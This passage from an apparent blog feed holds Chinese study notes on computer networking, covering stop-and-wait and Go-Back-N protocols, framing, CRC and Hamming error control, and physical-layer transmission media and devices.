title="3.ACK迟到"></a>3.ACK迟到</h4><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510142101297.png" alt="image-20210510142101297"></p><h3 id="停止等待协议分析"><a href="#停止等待协议分析" class="headerlink" title="停止等待协议分析"></a>停止等待协议分析</h3><p>有点：简单</p><p>缺点：信道利用率太低</p><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510142308941.png" alt="image-20210510142308941"></p><p>TD数据帧发送时延</p><p>RTT往返时延</p><p>TA确认帧发送时延</p><h3 id="信道利用率"><a href="#信道利用率" class="headerlink" title="信道利用率"></a>信道利用率</h3><p>发送方在一个发送周期内，有效地发送数据所需要的时间占整个发送周期的比率。</p><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510142508881.png" alt="image-20210510142508881"></p><p>信道吞吐率信道利用率*发送方的发送速率。</p><h4 id="一个例题"><a href="#一个例题" class="headerlink" title="一个例题"></a>一个例题</h4><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510142722089.png" alt="image-20210510142722089"></p><p>没有说确认帧的发送时延就不考虑</p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510142825141.png" alt="image-20210510142825141"></p><h2 id="3-4-3-后退N帧协议"><a href="#3-4-3-后退N帧协议" class="headerlink" title="3.4.3 后退N帧协议"></a>3.4.3 后退N帧协议</h2><h3 id="后退N帧协议的滑动窗口"><a href="#后退N帧协议的滑动窗口" class="headerlink" title="后退N帧协议的滑动窗口"></a>后退N帧协议的滑动窗口</h3><p>发送窗口：发送方维持一组连续的允许发送的帧的序号。</p><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510143652491.png" alt="image-20210510143652491"></p><p>接收窗口：接收方维持一组连续的允许接收的帧的序号。</p><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510143701350.png" alt="image-20210510143701350"></p><p>发送方和接收方发送数据的过程：</p><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510144002413.png" alt="image-20210510144002413"></p><h3 id="GBN协议中发送方必须响应的三件事"><a href="#GBN协议中发送方必须响应的三件事" class="headerlink" title="GBN协议中发送方必须响应的三件事"></a>GBN协议中发送方必须响应的三件事</h3><h4 id="1-上层的调用"><a href="#1-上层的调用" class="headerlink" title="1.上层的调用"></a>1.上层的调用</h4><p>上层要发送数据时，发送方先检査发送窗口是否已满，如果<strong>未满</strong>，则产生一个帧并将其发送；如果<strong>窗口已满</strong>，发送方只需将数据返回给上层，暗示上层窗口已满。上层等一会再发送。（实际实现中，发送方可以缓存这些数据，窗口不满时再发送帧）。</p><h4 id="2-后到一个ACK"><a href="#2-后到一个ACK" class="headerlink" title="2.后到一个ACK"></a>2.后到一个ACK</h4><p>GBN协议中，对n号帧的确认采用<strong>累计确认</strong>的方式，表明接收方已经收到n号帧和它之前的全部帧。</p><h4 id="3-超时事件"><a href="#3-超时事件" class="headerlink" title="3.超时事件"></a>3.超时事件</h4><p>协议的名字为后退N帧/回退N帧，来源于出现丢失和时延过长帧时发送方的行为。就像在停等协议中一样，定时器将再次用于恢复数据帧或确认帧的丢失。如果岀现超时，发送方重传所有已发送但未被确认的帧。</p><h3 id="GBN协议接收方要做的事"><a href="#GBN协议接收方要做的事" class="headerlink" title="GBN协议接收方要做的事"></a>GBN协议接收方要做的事</h3><p>如果正确收到n号帧，并且按序，那么接收方为n帧发送一个ACK，并将该帧中的数据部分交付给上层。</p><p>其余情况都丢弃帧，并为最近按序接收的帧重新发送ACK。接收方无需缓存任何失序帧，只需要维护一个信息：expectedseqnum（下一个按序接收的帧序号）。</p><h3 id="运行中的GBN协议"><a href="#运行中的GBN协议" class="headerlink" title="运行中的GBN协议"></a>运行中的GBN协议</h3><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510150311343.png" alt="image-20210510150311343"></p><h3 id="滑动窗口长度"><a href="#滑动窗口长度" class="headerlink" title="滑动窗口长度"></a>滑动窗口长度</h3><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510150553390.png" alt="image-20210510150553390"></p><p>如果采用2个比特对帧编号，那么他的窗口尺寸应该是[1,3]，如果窗口尺寸为4，假如现在发送0 1 2 3，全部出错，重新发送0 1 2 3 ，就无法区别现在的0 1 2 3是原来出错的还是未发送的新的。</p><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510150920191.png" alt="image-20210510150920191"></p><h3 id="GBN协议重点总结"><a href="#GBN协议重点总结" class="headerlink" title="GBN协议重点总结"></a>GBN协议重点总结</h3><p>1.累计确认(偶尔捎带确认)</p><p>累计确认：发送方按序发送n个帧，接收方收到后向接收方发送ACKn，发送方理解为n帧与之前帧都正确接收。</p><p> 偶然稍待确认：接收方将确认帧加到他想发送的数据内</p><p>2.接收方只按序接收帧，不按序无情丢弃</p><p>3.确认序列号最大、按序到达的帧 </p><p>4.发送窗口最大为(2^n) -1,接收窗口大小为1</p><h3 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h3><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510151849768.png" alt="image-20210510151849768"></p><p>GBN协议的性能分析</p><p>优点：连续发送帧提高了信道利用率</p><p>缺点：在重传时必须把原来已经正确传送的数据帧重传，使传输效率降低。</p><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510152257808.png" alt="image-20210510152257808"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-5(第三章)</title>
      <link href="/2021/05/08/ji-suan-ji-wang-luo-5/"/>
      <url>/2021/05/08/ji-suan-ji-wang-luo-5/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-5"><a href="#计算机网络-5" class="headerlink" title="计算机网络-5"></a>计算机网络-5</h1><span id="more"></span><h2 id="3-1-数据链路层功能概述"><a href="#3-1-数据链路层功能概述" class="headerlink" title="3.1 数据链路层功能概述"></a>3.1 数据链路层功能概述</h2><h3 id="数据链路层的研究思想"><a href="#数据链路层的研究思想" class="headerlink" title="数据链路层的研究思想"></a>数据链路层的研究思想</h3><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508151141240.png" alt="image-20210508151141240"></p><h3 id="数据链路层基本概念"><a href="#数据链路层基本概念" class="headerlink" title="数据链路层基本概念"></a>数据链路层基本概念</h3><ul><li><p>结点：</p><p>主机、路由器。</p></li><li><p>链路：</p><p>网络中两个结点之间的<strong>物理通道</strong>，链路的传输介质主要有双绞线、光纤和微波。分为有线链路、无线链路。</p></li><li><p>数据链路：</p><p>网络中两个结点之间的<strong>逻辑通道</strong>，把实现控制数据传输协议的硬件和软件加到链路上就构成数据链路。</p></li><li><p>帧：</p><p>链路层的协议数据单元，封装网络层数据报。</p></li></ul><p>数据链路层负责通过一条链路从一个结点向另一个物理链路直接相连的相邻结点传送数据报。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508152050831.png" alt="image-20210508152050831"></p><h3 id="数据链路层功能概述"><a href="#数据链路层功能概述" class="headerlink" title="数据链路层功能概述"></a>数据链路层功能概述</h3><p>数据链路层在物理层提供服务的基础上<strong>向网络层提供服务</strong>，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。其主要作用是<strong>加强物理层传输原始比特流的功能</strong>，将物理层提供的可能岀错的物理连接改造成为<strong>逻辑上无差错的数据链路</strong>，使之对网络层表现为一条无差错的链路。</p><ul><li><p>功能一：为网络层提供服务</p><p>无确认无连接服务，有确认无连接服务，有确认面向连接服务。</p><p>有连接一定有确认！</p></li><li><p>功能二：链路管理</p><p>即连接的建立、维持、释放(用于面向连接的服务)。</p></li><li><p>功能三：组帧</p></li><li><p>功能四：流量控制</p><p>限制发送方</p></li><li><p>功能五：差错控制(帧错/位错)。</p></li></ul><h2 id="3-2-封装成帧和透明传输"><a href="#3-2-封装成帧和透明传输" class="headerlink" title="3.2 封装成帧和透明传输"></a>3.2 封装成帧和透明传输</h2><h3 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h3><p><strong>封装成帧</strong>就是在一段数据的前后部分添加首部和尾部，这样就构成了一个帧。接收端在收到物理层上交的比特流后，就能根据首部和尾部的标记，从收到的比特流中识别帧的开始和结束。</p><p>首部和尾部包含许多的控制信息，他们的一个重要作用：<strong>帧定界</strong>(确定帧的界限)。</p><p><strong>帧同步</strong>：接收方应当能从接收到的二进制比特流中区分出帧的起始和中止。</p><p><strong>组帧的四种方法</strong>：</p><ol><li>字符统计法</li><li>字符(节)填充法</li><li>零比特填充法</li><li>违规编码法</li></ol><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508154056140.png" alt="image-20210508154056140"></p><p>数据部分的极限值叫做：最大传送单元MTU。不同的协议MTU长度也不同</p><h3 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h3><p><strong>透明传输</strong>是指不管所传数据是什么样的比特组合，都应当能够在链路上传送。因此，链路层就“看不见”有什么妨碍数据传输的东西。</p><p>当所传数据中的比特组合恰巧与某一个控制信息完全一样时，就必须采取适当的措施，使收方不会将这样的数据误认为是某种控制信息。这样才能保证数据链路层的传输是透明的。</p><h3 id="透明传输在组帧上的应用"><a href="#透明传输在组帧上的应用" class="headerlink" title="透明传输在组帧上的应用"></a>透明传输在组帧上的应用</h3><h4 id="1-字符计数法"><a href="#1-字符计数法" class="headerlink" title="1.字符计数法"></a>1.字符计数法</h4><p>帧首部使用一个计数字段（第一个字节，八位）来标明帧内字符数。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508155004741.png" alt="image-20210508155004741"></p><p>痛点：鸡蛋放在一个篮子里了，当前一个计数字段发生错误，后面的所有帧都会发生错误。</p><h4 id="2-字符填充法"><a href="#2-字符填充法" class="headerlink" title="2.字符填充法"></a>2.字符填充法</h4><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508155441916.png" alt="image-20210508155441916"></p><p>字符填充法的过程：</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508155913026.png" alt="image-20210508155913026"></p><h4 id="3-零比特填充法"><a href="#3-零比特填充法" class="headerlink" title="3.零比特填充法"></a>3.零比特填充法</h4><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508160423377.png" alt="image-20210508160423377"></p><p>5110：遇到5个1 填充一个0(即使后面是0也要填充)；发现5个1  删除一个0</p><h4 id="4-违规编码法"><a href="#4-违规编码法" class="headerlink" title="4.违规编码法"></a>4.违规编码法</h4><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508160914544.png" alt="image-20210508160914544"></p><p>由于字节计数法中 Count字段的脆弱性（其值若有差错将导致灾难性后果）及字符填充实现上的复杂性和不兼容性，目前较普遍使用的帧同步法是<strong>比特填充</strong>和<strong>违规编码法</strong>。</p><h2 id="3-3-1-差错控制-检错编码"><a href="#3-3-1-差错控制-检错编码" class="headerlink" title="3.3.1 差错控制(检错编码)"></a>3.3.1 差错控制(检错编码)</h2><h3 id="差错从何来？"><a href="#差错从何来？" class="headerlink" title="差错从何来？"></a>差错从何来？</h3><p>概括来说，传输中的差错都是由于噪声引起的。</p><p><strong>全局性</strong>：1.由于线路本身电气特性所产生的<strong>随机噪声</strong>（热噪声），是信道固有的，随机存在的。</p><p>解决办法：提高信噪比来减少或避免干扰。（对传感器下手）</p><p><strong>局部性</strong>：2.外界特定的短暂原因所造成的<strong>冲击噪声</strong>，是产生差错的主要原因。</p><p>解决办法：通常利用编码技术来解决。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508192433639.png" alt="image-20210508192433639"></p><h3 id="数据链路层的差错控制"><a href="#数据链路层的差错控制" class="headerlink" title="数据链路层的差错控制"></a>数据链路层的差错控制</h3><p>在数据链路层进行差错控制可以提早的发现差错，避免错误的数据一直传输下去</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508193504169.png" alt="image-20210508193504169"></p><pre class="line-numbers language-none"><code class="language-none">冗余编码在数据发送之前，先按某种关系附加上一定的冗余位，构成一个符合某一规则的码字后再发送。当要发送的有效数据变化时，相应的冗余位也随之变化，使码字遵从不变的规则。接收端根据收到码字是否仍符合原规则，从而判断是否出错。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">海明码不但可以知道出错了，还可以知道哪里出了错<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">编码VS编码数据链路层编码和物理层的数据编码与调制不同。物理层编码针对的是单个比特，解决传输过程中比特的同步等问题，如曼彻斯特编码。而数据链路层的编码针对的是一组比特，它通过冗余码的技术实现一组二进制比特串在传输过程是否出现了差错。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="检错编码–奇偶校验码"><a href="#检错编码–奇偶校验码" class="headerlink" title="检错编码–奇偶校验码"></a>检错编码–奇偶校验码</h3><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508194756119.png" alt="image-20210508194756119"></p><h4 id="一个奇偶校验码例题"><a href="#一个奇偶校验码例题" class="headerlink" title="一个奇偶校验码例题"></a>一个奇偶校验码例题</h4><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508194847427.png" alt="image-20210508194847427"></p><p>因为采用奇校验所以在原信息元前+1，1个数为5，选项中ABC 1个数为4，1个数发生了变化，D 1个数为5.1个数未发生变化，说明ABC发生了错误，而D不确定是否发生错误。因为发生偶数个出错无法检查出来。</p><p>奇偶校验码特点：只能检査出<strong>奇数个比特</strong>错误，检错能力为50%。</p><h3 id="检错编码–CRC循环冗余码"><a href="#检错编码–CRC循环冗余码" class="headerlink" title="检错编码–CRC循环冗余码"></a>检错编码–CRC循环冗余码</h3><h4 id="简单方法看CRC循环冗余码"><a href="#简单方法看CRC循环冗余码" class="headerlink" title="简单方法看CRC循环冗余码"></a>简单方法看CRC循环冗余码</h4><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508200745075.png" alt="image-20210508200745075"></p><h4 id="一个CRC循环冗余码例题"><a href="#一个CRC循环冗余码例题" class="headerlink" title="一个CRC循环冗余码例题"></a>一个CRC循环冗余码例题</h4><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508200952613.png" alt="image-20210508200952613"></p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508201300915.png" alt="image-20210508201300915"></p><p>在数据链路层仅仅使用循环冗余检验CRC差错检测技术，只能做到对帧的无差错接收，即“凡是接收端数据链路层接受的帧，我们都能以非常接近于1的概率认为这些帧在传输过程中没有产生差错”。接收端丢弃的帧虽然曾收到了，但是最终还是因为有差错被丢弃。“凡是接收端数据链路层接收的帧均无差错”。</p><p>“可靠传输”：数据链路层发送端发送什么，接收端就收到什么</p><p>链路层使用CRC检验，能够实现无比特差错的传输，但这还不是可靠传输。</p><h2 id="3-3-2-差错控制-纠错编码"><a href="#3-3-2-差错控制-纠错编码" class="headerlink" title="3.3.2 差错控制(纠错编码)"></a>3.3.2 差错控制(纠错编码)</h2><h3 id="纠错编码–海明码"><a href="#纠错编码–海明码" class="headerlink" title="纠错编码–海明码"></a>纠错编码–海明码</h3><p>海明码：<strong>发现双</strong>比特错，<strong>纠正单</strong>比特错。</p><p>工作原理：牵一发而动全身</p><p>动了一个数据，会使很多个校验码察觉出来，他们之间互相交流，最终会确定哪一位发生了错误。</p><p>工作流程：</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508202532438.png" alt="image-20210508202532438"></p><h3 id="1-确定校验码的位数r"><a href="#1-确定校验码的位数r" class="headerlink" title="1.确定校验码的位数r"></a>1.确定校验码的位数r</h3><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508202918659.png" alt="image-20210508202918659"></p><h3 id="2-确定校验码和数据的位置"><a href="#2-确定校验码和数据的位置" class="headerlink" title="2.确定校验码和数据的位置"></a>2.确定校验码和数据的位置</h3><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508203059482.png" alt="image-20210508203059482"></p><h3 id="3-求出校验码的值"><a href="#3-求出校验码的值" class="headerlink" title="3.求出校验码的值"></a>3.求出校验码的值</h3><p>二进制位数看最后一位到几位，比如10二进制为1010，所以二进制用4位</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508203636981.png" alt="image-20210508203636981"></p><p>校验码的值：</p><p>P1二进制第四位为1，同样第四位为1的还有D1 D2 D4 D5，我们将他们异或为0即可得到P1。P2 P3 P4同理。</p><h3 id="4-检错并纠错"><a href="#4-检错并纠错" class="headerlink" title="4.检错并纠错"></a>4.检错并纠错</h3><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508204358573.png" alt="image-20210508204358573"></p><p>首先我们将所有要校验的位进行异或运算(具体哪几位进行异或见上步)</p><p>我们计算后按照 P4 P3 P2 P1排序，本题得到0101，对应十进制5，说明第5位出错，将第5位改为他的反码即可修正</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/08/ji-suan-ji-wang-luo-5/image-20210508204957056.png" alt="image-20210508204957056"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-4(第二章)</title>
      <link href="/2021/05/08/ji-suan-ji-wang-luo-4/"/>
      <url>/2021/05/08/ji-suan-ji-wang-luo-4/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-4"><a href="#计算机网络-4" class="headerlink" title="计算机网络-4"></a>计算机网络-4</h1><span id="more"></span><h2 id="2-2-物理层传输介质"><a href="#2-2-物理层传输介质" class="headerlink" title="2.2 物理层传输介质"></a>2.2 物理层传输介质</h2><h3 id="传输介质及分类"><a href="#传输介质及分类" class="headerlink" title="传输介质及分类"></a>传输介质及分类</h3><p>传输介质也称传输媒体/传输媒介，他就是数据传输系统在发送设备和接收设备之间的<strong>物理通路</strong>。</p><p><strong>传输媒体并不是物理层</strong>。传输媒体在物理层下面，因为物理层是体系结构的第一层，因此又称传输媒体为第0层。在传输媒体中传输的是信号，但传输媒体并不知道传输的信号代表什么意思。但物理层规定了<strong>电气特性</strong>，因此能够识别所传输的比特流。</p><p>传输介质分为：</p><ul><li><p><strong>导向性传输介质</strong></p><p>电磁波被导向沿着固体媒介(铜线/光纤)传播。</p></li><li><p><strong>非导向型传输介质</strong></p><p>自由空间，介质可以是空气、真空、海水等。</p></li></ul><h3 id="导向性传输介质–1-双绞线"><a href="#导向性传输介质–1-双绞线" class="headerlink" title="导向性传输介质–1.双绞线"></a>导向性传输介质–1.双绞线</h3><p>双绞线是古老、又最常用的传输介质，它由俩根采用一定规则并排<strong>绞合</strong>的、相互绝缘的<strong>铜导线</strong>组成。</p><p><strong>绞合可以减少对相邻导线的电磁干扰。</strong></p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508135349109.png" alt="image-20210508135349109"></p><p>为了进一步提高抗电磁干扰能力，可在双绞线的外面再加上一个由<strong>金属丝</strong>编织成的屏蔽层，这就是<strong>屏蔽双绞线（STP）</strong>，无屏蔽层的双绞线就称为<strong>非屏蔽双绞线（UTP）</strong>。</p><p>双绞线价格便宜，是最常用的传输介质之一，在局域网和传统电话网中普遍使用。模拟传输和数字传输都可以使用双绞线，其通信距离一般为几公里到数十公里。距离太远时，对于<strong>模拟传输</strong>，要用<strong>放大器</strong>放大衰减的信号；对于<strong>数字传输</strong>，要用<strong>中继器</strong>将失真的信号整形。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508135712397.png" alt="image-20210508135712397"></p><h3 id="导向性传输介质–2-同轴电缆"><a href="#导向性传输介质–2-同轴电缆" class="headerlink" title="导向性传输介质–2.同轴电缆"></a>导向性传输介质–2.同轴电缆</h3><p>同轴电缆由<strong>导体铜质芯线、绝缘层、网状编织屏蔽层</strong>和<strong>塑料外层</strong>构成。按特性阻抗数值的不同，通常将同轴电缆分为两类：50Ω同轴电缆和75Ω同轴电缆。其中，50Ω同轴电缆主要用于传送基带数字信号，又称为<strong>基带同轴电缆</strong>，它在局域网中得到广泛应用；75Ω同轴电缆主要用于传送宽带信号，又称为<strong>宽带同轴电缆</strong>，它主要用于有线电视系统。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508140107638.png" alt="image-20210508140107638"></p><h4 id="同轴电缆VS双绞线"><a href="#同轴电缆VS双绞线" class="headerlink" title="同轴电缆VS双绞线"></a>同轴电缆VS双绞线</h4><p>由于外导体屏蔽层的作用，同轴电缆<strong>抗干扰特性比双绞线好</strong>，被广泛用于传输较高速率的数据，其<strong>传输距离更远</strong>，但<strong>价格较双绞线贵</strong>。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508140219533.png" alt="image-20210508140219533"></p><h3 id="导向性传输介质–3-光纤"><a href="#导向性传输介质–3-光纤" class="headerlink" title="导向性传输介质–3.光纤"></a>导向性传输介质–3.光纤</h3><p>光纤通信就是利用光导纤维（简称光纤）传递<strong>光脉冲</strong>来进行通信。有光脉冲表示1，无光脉冲表示0。而可见光的频率大约是10^8MHz，因此光纤通信系统的<strong>带宽远远大于</strong>目前其他各种传输媒体的带宽。</p><p>光纤在发送端有光源，可以采用发光二极管或半导体激光器，它们在电脉冲作用下能产生出光脉冲；在接收端用光电二极管做成光检测器，在检测到光脉冲时可还原出电脉冲。</p><p>光纤主要由<strong>纤芯（实心的！）</strong>和<strong>包层</strong>构成，光波通过纤芯进行传导，包层较纤芯有较低的折射率。当光线从高折射率的介质射向低折射率的介质时，其折射角将大于入射角。因此，如果入射角足够大，就会出现<strong>全反射</strong>，即光线碰到包层时候就会折射回纤芯、这个过程不断重复，光也就沿着光纤传输下去。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508141050078.png" alt="image-20210508141050078"></p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508141721941.png" alt="image-20210508141721941"></p><table><thead><tr><th align="center"></th><th>定义</th><th align="left">光源</th><th>特点</th><th>外观</th></tr></thead><tbody><tr><td align="center">单模光纤</td><td>一种在<strong>横向模式</strong>直接传输光信号的光纤</td><td align="left"><strong>定向</strong>性很好的<strong>激光</strong>二极管</td><td><strong>损耗小</strong>，适合<strong>远</strong>距离传输</td><td><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508141546066.png" alt="image-20210508141546066"></td></tr><tr><td align="center">多模光纤</td><td>有<strong>多种</strong>传输光信号模式的光纤</td><td align="left">发光二极管</td><td><strong>易失真</strong>，适合<strong>近</strong>距离传输</td><td><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508141653475.png" alt="image-20210508141653475"></td></tr></tbody></table><h4 id="光纤的特点："><a href="#光纤的特点：" class="headerlink" title="光纤的特点："></a>光纤的特点：</h4><ol><li>传输<strong>损耗小</strong>，中继距离长，对远距离传输特别经济。</li><li><strong>抗雷电和电磁干扰性能好</strong>。</li><li>无串音干扰，保密性好，也<strong>不易被窃听或截取数据</strong>。</li><li><strong>体积小，重量轻</strong>。</li></ol><h3 id="非导向性传输介质"><a href="#非导向性传输介质" class="headerlink" title="非导向性传输介质"></a>非导向性传输介质</h3><p>非导向性传输介质：</p><ul><li>无线电波</li><li>微波</li><li>红外线、激光</li></ul><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508143532693.png" alt="image-20210508143532693"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508143626522.png" alt="image-20210508143626522"></p><h2 id="2-3-物理层设备"><a href="#2-3-物理层设备" class="headerlink" title="2.3 物理层设备"></a>2.3 物理层设备</h2><h3 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h3><p><strong>诞生原因</strong>：由于存在损耗，在线路上传输的信号功率会逐渐衰减，衰减到一定程度时将造成信号失真，因此会导致接收错误。</p><p><strong>中继器的功能</strong>：对信号进行<strong>再生和还原</strong>，对衰减的信号进行放大，保持与原数据相同，以增加信号传输的距离，延长网络的长度。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508144406831.png" alt="image-20210508144406831"></p><p><strong>中继器的两端</strong>：两端的网络部分是网段，而不是子网，适用于完全相同的<strong>两类</strong>网络的互连，且两个网段速率要相同。</p><p>中继器只将任何电缆段上的数据发送到另一段电缆上，它仅作用于信号的电气部分，并不管数据中是否有错误数据或不适于网段的数据。</p><p>两端可连相同媒体，也可连不同媒体。</p><p>中继器两端的网段一定要是同一个协议。（中继器不会存储转发，傻）</p><p><strong>5-4-3规则</strong>：网络标准中都对信号的延迟范围作了具体的规定，因而中继器只能在规定的范围内进行，否则会网络故障。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508144653328.png" alt="image-20210508144653328"></p><p>5个网段，4个物理层设备，3个段可以连接计算机</p><h3 id="集线器-多口中继器"><a href="#集线器-多口中继器" class="headerlink" title="集线器(多口中继器)"></a>集线器(多口中继器)</h3><p>再生，放大信号。</p><p><strong>集线器的功能</strong>：对信号进行再生<strong>放大转发</strong>，对衰减的信号进行放大，接着转发到其他所有(除输入端口外)处于工作状态的端口上，以增加信号传输的距离，延长网络的长度。不具备信号的定向传送能力，是一个共享式设备。</p><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508145758756.png" alt="image-20210508145758756"></p><h2 id="2-4-第二章总结"><a href="#2-4-第二章总结" class="headerlink" title="2.4 第二章总结"></a>2.4 第二章总结</h2><p><img src="/2021/05/08/ji-suan-ji-wang-luo-4/image-20210508150050990.png" alt="image-20210508150050990"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-3(第二章)</title>
      <link href="/2021/05/06/ji-suan-ji-wang-luo-3/"/>
      <url>/2021/05/06/ji-suan-ji-wang-luo-3/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-3"><a href="#计算机网络-3" class="headerlink" title="计算机网络-3"></a>计算机网络-3</h1><span id="more"></span><h2 id="2-1-1-物理层基本概念"><a href="#2-1-1-物理层基本概念" class="headerlink" title="2.1.1 物理层基本概念"></a>2.1.1 物理层基本概念</h2><p>物理层解决如何在连接各种计算机的传输媒体上<strong>传输数据比特流</strong>，而不是指具体的传输媒体。</p><p>物理层主要任务：确定传输媒体接口有关的一些特性→定义标准</p><p>物理层规定的四个特性：</p><ol><li><p>机械特性</p><p>定义物理连接的特性，规定物理连接时所采用的规格、接口形状、<strong>引线数目</strong>、<strong>引脚数量</strong>和排列状况。</p></li><li><p>电气特性</p><p>规定传输二进制位时，线路上信号的<strong>电压范围</strong>、阻抗匹配、传输<strong>速率</strong>和<strong>距离</strong>限制等。</p></li><li><p>功能特性</p><p>指明某条线上出现某一<strong>电平表示何种意义</strong>，接口部件信号线的用途。</p></li><li><p>规程特性（过程特性）</p><p>定义各条物理线路的工作<strong>规程</strong>和<strong>时序</strong>关系。</p></li></ol><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210506220033281.png" alt="image-20210506220033281"></p><h2 id="2-1-2-数据通信基础知识"><a href="#2-1-2-数据通信基础知识" class="headerlink" title="2.1.2 数据通信基础知识"></a>2.1.2 数据通信基础知识</h2><h3 id="典型的数据通信模型"><a href="#典型的数据通信模型" class="headerlink" title="典型的数据通信模型"></a>典型的数据通信模型</h3><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210506220712285.png" alt="image-20210506220712285"></p><h3 id="数据通信的相关术语"><a href="#数据通信的相关术语" class="headerlink" title="数据通信的相关术语"></a>数据通信的相关术语</h3><p>通信的目的是<strong>传送信息</strong></p><p><strong>数据</strong>：传送信息的实体，通常是有意义的符号序列。</p><p><strong>信号</strong>：数据的电气/电磁的表现，是数据在传输过程中的<strong>存在形式</strong>。</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210506221712630.png" alt="image-20210506221712630"></p><p><strong>信源</strong>：产生和发送数据的源头。</p><p><strong>信宿</strong>：接收数据的终点</p><p><strong>信道</strong>：信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条通信线路往往包含一条发送信道和一条接收信道。</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210506221721669.png" alt="image-20210506221721669"></p><h3 id="三种通信方式"><a href="#三种通信方式" class="headerlink" title="三种通信方式"></a>三种通信方式</h3><p>从通信双方信息的交互方式看，可以有三种基本方式：</p><ol><li><p>单工通信  </p><p>只有一个方向的通信而没有反方向的交互，仅需要一条信道。</p></li><li><p>半双工通信  </p><p>通信的双方都可以发送或接收信息，但任何一方都不能同时发送和接收，需要两条信道。</p></li><li><p>全双工通信</p><p>通信双方可以同时发送和接受信息，也需要两条信道。</p></li></ol><h3 id="俩种数据传输方式"><a href="#俩种数据传输方式" class="headerlink" title="俩种数据传输方式"></a>俩种数据传输方式</h3><ul><li><p>串行传输  </p><p>速度慢、费用低、适合远距离</p></li><li><p>并行传输</p><p>速度快、费用高、适合近距离   用于计算机内部数据传输</p></li></ul><p><img 